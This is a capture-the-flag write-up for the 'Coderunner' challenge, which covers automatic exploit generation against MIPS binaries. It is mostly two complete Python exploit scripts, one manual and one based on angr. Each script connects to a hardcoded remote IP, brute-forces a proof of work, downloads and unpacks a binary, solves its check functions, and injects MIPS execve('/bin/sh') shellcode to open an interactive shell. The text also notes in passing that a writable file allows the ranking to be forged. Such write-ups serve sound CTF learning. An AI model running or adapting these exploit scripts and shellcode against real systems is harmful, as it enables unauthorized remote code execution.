# Writeup of Coderunner
It is a chllenge about AEG & mips-asm.

## setup
```
cd ./docker
docker build -t pwn .
docker run -d -p "0.0.0.0:9999:9999" --name="pwn" pwn
```

## Solution
There are several types of check functions（6types * 16 rounds).
I wish you guys would know mips-instruction more by reading mips-asm / analysising / imatating.
But this challenge is harder than I expected. The check part wastes too much time and the timelimit is too strict.
By the way, The file Time is able to write, and the context(which you can forge) will be updated to Rank. 
There are two types of exp for this challenge.

### Manual analysis
fast but annoying

1) Get some binary
2) specific solution of each type of check function
    1. Get the Bytecode
    2. Feature recognition
    3. Parameter extraction 
3) shellcode 
   
This rough exp sometimes may work <3.
```python
from pwn import *
import subprocess
import base64
from z3 import *
context.log_level='debug'
context.arch='mips'
def analys(name='./1'):
    b=ELF(name)
    entry=b.sym['main']+(0xa8-0x1c)
    entry=entry-0x400000
    tmp=open("./1","r")
    check=u32(tmp.read()[entry:entry+3]+'\0')<<2
    check=check+(0xbc-0x28)-0x400000
    tmp.close()
    tmp=open("./1",'r')
    END=(u32(tmp.read()[check:check+3]+'\0')<<2)-4
    tmp.close()
    # now we get the END of check funcs
    START=0x400bb0
    f=open(name)
    f.read(0xbb0)
    data=f.read(END-START)[44:]
    f.close()
    tmp=data.split("\x08\x00\xe0\x03\x00\x00\x00\x00")
    assert(len(tmp)==16)
    return tmp
def judge(s):
    if(s=='\x10'):
        return 1#<
    else:
        return 0#>=
def type_1(s):
    # asb(s[0]*s[0]-s[3]*s[3])?asb(s[1]*s[1]-s[2]*s[2])
    # asb(s[1]*s[1]-s[0]*s[0])?asb(s[2]*s[2]-s[3]*s[3])
    s=s[24:]
    tmp=ord(s[0][0])
    idx_list=[tmp,(tmp+1)%4,(tmp+2)%4,(tmp+3)%4]
    m1=judge(s[0xa8+7])
    m2=judge(s[0x160+7])
    """
    tmp=[]
    for x in range(4):
        tmp.append(Int('x{}'.format(x)))
    
    solver = Solver()
    for x in range(4):
        solver.add(tmp[x]>=0,tmp[x]<256)
    if(m1):
        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])<(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))
    else:
        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])>=(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))
    if(m2):
        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])<(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))
    else:
        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])>=(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))

    if solver.check() == sat:
        res=solver.model()
        print res
        print m1,m2
    """
    if m1==1 and m2==1:
        res_list=[79,192,215,18]
    elif m1==1 and m2==0:
        res_list=[93,246,240,81]
    elif m1==0 and m2==1:
        res_list=[0,88,38,80]
    else:
        res_list=[227,70,35,163]
    tmp=zip(idx_list,res_list)
    res=''
    tmp.sort()
    for _ in tmp:
        res+=chr(_[1])
    return res
def type_2(s):
    # s[0]+s[1] != ?
    # s[1]+s[2] != ?
    # s[2]+s[3] != ?
    # s[3]+s[0] != ?
    return p32(0xdeadbeef)
def type_3(s):
    # s[0]+s[1]+s[2]== ?
    # s[1]+s[2]+s[3]== ?
    # s[2]+s[3]+s[0]== ?
    # s[3]+s[0]+s[1]== ?
    s=s[24:24+0xdc]
    s=s.split("\0"+'\x62\x14')
    s.pop()
    idx_list=[((x+ord(s[0][0]))-1)%4 for x in range(4)]
    res_list=[]
    for _ in range(4):
        res_list.append(u16(s[_][-5:-3]))
    sig=sum(res_list)/3
    tmp_list=[]
    for _ in range(4):
        tmp_list.append(sig-res_list[_])
    tmp=zip(idx_list,tmp_list)
    res=''
    tmp.sort()
    for _ in range(4):
        res+=chr(tmp[_][1])
    return res
def type_4(s):
    # s[0] == ?
    # s[1] == ?
    # s[2] == s[0] * s[0]
    # s[3] == s[1]*s[1]+s[2]*s[2]-s[0]*s[0]
    s=s[24:]
    if(ord(s[0])==0):
        idx_list=[0,1,2,3]
    else:
        idx_list=[]
        for _ in range(4):
            idx_list.append((ord(s[0])+_)%4)
    res_list=[]
    tmp=s.find('\x00\x02\x24')
    res_list.append(ord(s[tmp-1]))
    res_list.append(ord(s[s.find('\x00\x02\x24',tmp+1)-1]))
    res_list.append((res_list[0]*res_list[0])%256)
    res_list.append(((res_list[1]*res_list[1])+(res_list[2]*res_list[2])-(res_list[0]*res_list[0]))%256)
    tmp=zip(idx_list,res_list)
    tmp.sort()
    res=''
    for _ in tmp:
        res+=chr(_[1])
    return res
def type_5(s):
    # s[0]^s[1] == ?
    # s[1] == ?
    # s[2] == ((s[0]^s[1]&0x7f)*2)%256
    # s[3] == s[0]^s[1]^s[2]
    s=s[24:24+172]
    s=s.split('\x00\x62\x14')
    res_list=[]
    tmp=ord(s[1][-5])
    res_list.append(ord(s[0][-5])^tmp)
    res_list.append(tmp)
    res_list.append((((res_list[0]^res_list[1])&0x7f)*2)%256)
    res_list.append(res_list[0]^res_list[1]^res_list[2])
    idx_list=[(x+ord(s[0][0]))%4 for x in range(4)]
    tmp=zip(idx_list,res_list)
    tmp.sort()
    res=''
    for x in tmp:
        res+=chr(x[1])
    return res
def type_6(s):
    # s[0]=s[2]
    # s[3]=s[1]
    # s[3]= ?
    # s[2]= ?
    s=s[24:24+0x64]
    s=s.split('\x00\x62\x14')
    s.pop()
    tmp=ord(s[0][0])
    idx_list=[tmp,(tmp+2)%4,(tmp+3)%4,(tmp+1)%4]
    res_list=[]
    res_list.append(ord(s[3][-5]))
    res_list.append(ord(s[3][-5]))
    res_list.append(ord(s[2][-5]))
    res_list.append(ord(s[2][-5]))
    tmp=zip(idx_list,res_list)
    tmp.sort()
    res=''
    for _ in tmp:
        res+=chr(_[1])
    return res
######################
def get_flag(data):
    p.readuntil("Faster > \n")
    p.send(data.ljust(0x100,'\x00'))
    p.readuntil("Name\n> ")
    p.send("niernier".ljust(8,'\x00'))
    p.readuntil("> \n")
    sh='''
    li $a0,0x6e69622f
    sw $a0,0($sp)
    li $a0,0x68732f
    sw $a0,4($sp)
    move $a0,$sp
    li $v0,4011
    li $a1,0
    li $a2,0
    syscall
    '''
    print(len(asm(sh)))
    p.send(asm(sh))
    p.interactive()
import hashlib
def do_pow():
    p.readuntil('hashlib.sha256(s).hexdigest() == "')
    res=p.read(64)
    for a in range(256):
        for b in range(256):
            for c in range(256):
                    if(hashlib.sha256(chr(a)+chr(b)+chr(c)).hexdigest()==res):
                        p.sendlineafter(">\n",chr(a)+chr(b)+chr(c))
                        return
    print "???"
    
######################

if __name__ == "__main__":
    if(1):
        ret=subprocess.Popen("rm -rf ./1".split(" "))
        ret.wait()
        ret=subprocess.Popen("rm -rf ./1.gz".split(" "))
        ret.wait()
    if(1):
        # start
        p=remote('106.53.114.216',9999)
        do_pow()
        #get binart
        p.readuntil("="*15+"\n")
        data=p.readuntil("\n")[:-1]
        f=open("./"+str(1)+".gz","w+")
        data=base64.b64decode(data)
        f.write(data)
        f.close()
        # get finished
        ret=subprocess.Popen("gunzip ./1.gz".split(" "))
        ret.wait()
        ret=subprocess.Popen("chmod +x ./1".split(" "))
        ret.wait()
    else:
        p=process("qemu-mipsel -L /usr/mipsel-linux-gnu/ ./1".split(" "))
    if(1):
        func=analys()
        payload=''
        for _ in func:
            if(len(_)>=109*4):# certain
                payload=type_1(_)+payload
            elif (len(_)<=49*4 and len(_)>=47*4):# s[0]:1/3 times
                payload=type_2(_)+payload
            elif (len(_)==74*4):# certain
                payload=type_3(_)+payload
            elif (len(_)>=76*4 and len(_)<=80*4):# s[0]:1/3/5 times
                payload=type_4(_)+payload
            elif (len(_)>=63*4 and len(_)<=66*4): #s[0] 1/4/3 times
                payload=type_5(_)+payload
            elif (len(_)>=42*4 and len(_)<=44*4):
                payload=type_6(_)+payload
            else:
                print len(_)/4
                print (_)
                print("Ouch! An erron was detected!")
        get_flag(payload)
        
    ret=subprocess.Popen("rm -rf ./1*".split(" "))
    ret.wait()
```


### Angr

I expected that it could be solved within two seconds, however, I found that it could not succeed in about 1.3 seconds during the game. This mythod which takes 1.5s is a little slower but I think this one is better.（abs checker needs z3）
Exploit comes from MozhuCY@Nu1L and Mr.R@Nu1L .

```python
import angr
import claripy
import re
import hashlib
from capstone import *
import sys
from pwn import *
import time
from random import *
import os
import logging
logging.getLogger('angr').setLevel('ERROR')
logging.getLogger('angr.analyses').setLevel('ERROR')
logging.getLogger('pwnlib.asm').setLevel('ERROR')
logging.getLogger('angr.analyses.disassembly_utils').setLevel('ERROR')

context.log_level = "ERROR"

def pow(hash):
    for i in range(256):
        for j in range(256):
            for k in range(256):
                tmp = chr(i)+chr(j)+chr(k)
                if hash == hashlib.sha256(tmp).hexdigest():
                    print tmp
                    return tmp

#21190da8c2a736569d9448d950422a7a a1 < a2
#2a1fae6743ccdf0fcaf6f7af99e89f80 a2 <= a1
#8342e17221ff79ac5fdf46e63c25d99b a1 < a2
#51882b30d7af486bd0ab1ca844939644 a2 <= a1
tb = {
    "6aa134183aee6a219bd5530c5bcdedd7":{
        '21190da8c2a736569d9448d950422a7a':{
            '8342e17221ff79ac5fdf46e63c25d99b':"\xed\xd1\xda\x33",
            '51882b30d7af486bd0ab1ca844939644':"\x87\x6e\x45\x82"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '51882b30d7af486bd0ab1ca844939644':'\xb7\x13\xdf\x8d',
            '8342e17221ff79ac5fdf46e63c25d99b':'\x2f\x0f\x2c\x02'
        }
    },
    "745482f077c4bfffb29af97a1f3bd00a":{
        '21190da8c2a736569d9448d950422a7a':{
            '51882b30d7af486bd0ab1ca844939644':"\x57\xcf\x81\xe7",
            '8342e17221ff79ac5fdf46e63c25d99b':"\x80\xbb\xdf\xb1"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '51882b30d7af486bd0ab1ca844939644':"\x95\x3e\xf7\x4e",
            '8342e17221ff79ac5fdf46e63c25d99b':"\x1a\xc3\x00\x92"
        }
    },
    "610a69b424ab08ba6b1b2a1d3af58a4a":{
        '21190da8c2a736569d9448d950422a7a':{
            '51882b30d7af486bd0ab1ca844939644':"\xfb\xef\x2b\x2f",
            '8342e17221ff79ac5fdf46e63c25d99b':"\x10\xbd\x00\xac"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '51882b30d7af486bd0ab1ca844939644':'\xbd\x7a\x55\xd3',
            '8342e17221ff79ac5fdf46e63c25d99b':'\xbc\xbb\xff\x4a'
        }
    },
    "b93e4feb8889770d981ef5c24d82b6cc":{
        '21190da8c2a736569d9448d950422a7a':{
            '51882b30d7af486bd0ab1ca844939644':"\x2f\xfb\xef\x2b",
            '8342e17221ff79ac5fdf46e63c25d99b':"\xac\x10\xbd\x00"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '8342e17221ff79ac5fdf46e63c25d99b':'\x4a\xbc\xbb\xff',
            '51882b30d7af486bd0ab1ca844939644':'\xd3\xbd\x7a\x55'
        }
    }
}

# hd = [i.start()for i in re.finditer("e0ffbd27".decode("hex"),f)]

def findhd(addr):
    while True:
        code = f[addr:addr + 4]
        if(code == "e0ffbd27".decode("hex")):
            return addr
        addr -= 4

def dejmp(code):
    c = ""
    d = Cs(CS_ARCH_MIPS,CS_MODE_MIPS32)
    for i in d.disasm(code,0):
        flag = 1
        if("b" in i.mnemonic or "j" in i.mnemonic):
            flag = 0
        #print("0x%x:\t%s\t%s"%(i.address,i.mnemonic,i.op_str))
        if flag == 1:
            c += code[i.address:i.address+4]
    return c

# @func_set_timeout(1)
# @timeout_decorator.timeout(1)
def calc(func_addr,find,avoid):
    # p = angr.Project(filename,auto_load_libs = False)
    start_address = func_addr
    state = p.factory.blank_state(addr=start_address)

    tmp_addr = 0x20000

    ans = claripy.BVS('ans', 4 * 8)
    state.memory.store(tmp_addr, ans)
    state.regs.a0 = 0x20000

    sm = p.factory.simgr(state)
    sm.explore(find=find,avoid=avoid)

    if sm.found:
        solution_state = sm.found[0]
        solution = solution_state.se.eval(ans)#,cast_to=str)
        # print(hex(solution))
        return p32(solution)[::-1]

def Calc(func_addr,find,avoid):
    try:
        tmp1 = hashlib.md5(dejmp(f[avoid - 0x80:avoid])).hexdigest()
        tmp2 = hashlib.md5(f[avoid-0xdc:avoid-0xdc+4]).hexdigest()
        tmp3 = hashlib.md5((f[avoid - 0x24:avoid-0x20])).hexdigest()
        return tb[tmp1][tmp2][tmp3]
    except:
        try:
            ret = calc(func_addr + base,find + base,avoid + base)
            return ret
        except:
            print "%s %s %s %x"%(tmp1,tmp2,tmp3,func_addr)

# calc(0x401b34,0x401978,0x401c48)
# calc(0x401978,0x401b08,0x401b18)

# if __name__=="__main__":

while True:
    try:
        os.system("rm out.gz")
        os.system("rm out")
        r = remote("106.53.114.216",9999)

        r.recvline()
        sha = r.recvline()
        sha = sha.split("\"")[1]
        s = pow(sha)
        r.sendline(s)

        log.success("pass pow")
        r.recvuntil("===============\n")
        dump = r.recvline()

        log.success("write gz")

        o = open("out.gz","wb")
        o.write(dump.decode("base64"))
        o.close()

        log.success("gunzip")
        os.system("gzip -d out.gz")
        os.system("chmod 777 out")
        # r = remote("127.0.0.1",8088)
        log.success("angr")
        # filename = "./1294672722"
        filename = "out"
        base = 0x400000
        p = angr.Project(filename,auto_load_libs = False)
        f = open(filename,"rb").read()
        final = 0xb30

        vd = [i.start()for i in re.finditer("25100000".decode("hex"),f)]
        vd = vd[::-1]
        chk = ""
        n = 0
        for i in range(len(vd) - 1):
            if(vd[i] <= 0x2000):
                n += 1
                func = findhd(vd[i])
                find = findhd(vd[i + 1])
                avoid = vd[i]
                ret = Calc(func,find,avoid)
                # print ret
                chk += ret
        n += 1
        func = findhd(vd[len(vd) - 1])
        find = final
        avoid = vd[len(vd) - 1]
        ret = Calc(func,find,avoid)
        # print ret
        chk += ret

        print chk.encode("hex")
        # chk = 'f1223fb171a0e700f3447552d3bd7a55a1f0a2f300809c0046e5fd5ed12c9696000000be961a961a00a420e60cf4f00800060000e54961e3a366c9acd3bd7a55'
        # chk = chk.decode('hex')
        r.recvuntil("Faster")
        r.sendafter(">",chk)
        context.arch = 'mips'
        success(r.recvuntil("Name"))
        r.sendafter(">","g"*8)
        ret_addr = vd[1]-0x34-0x240+base
        success(hex(ret_addr))
        shellcode = 'la $v1,{};'.format(hex(ret_addr))
        shellcode += 'jr $v1;'
        shellcode = asm(shellcode)
        print(shellcode.encode('hex'))
        r.sendafter(">",shellcode)
        r.sendafter("Faster > ",chk)
        success(r.recvuntil("Name"))
        r.sendafter(">","gg")
        shellcode = ''
        shellcode += "\xff\xff\x06\x28"
        shellcode += "\xff\xff\xd0\x04"
        shellcode += "\xff\xff\x05\x28"
        shellcode += "\x01\x10\xe4\x27"
        shellcode += "\x0f\xf0\x84\x24"
        shellcode += "\xab\x0f\x02\x24"
        shellcode += "\x0c\x01\x01\x01"
        shellcode += "/bin/sh"
        print(len(shellcode))
        r.sendafter(">",shellcode)
        r.interactive()
    except Exception as e:
        print e
```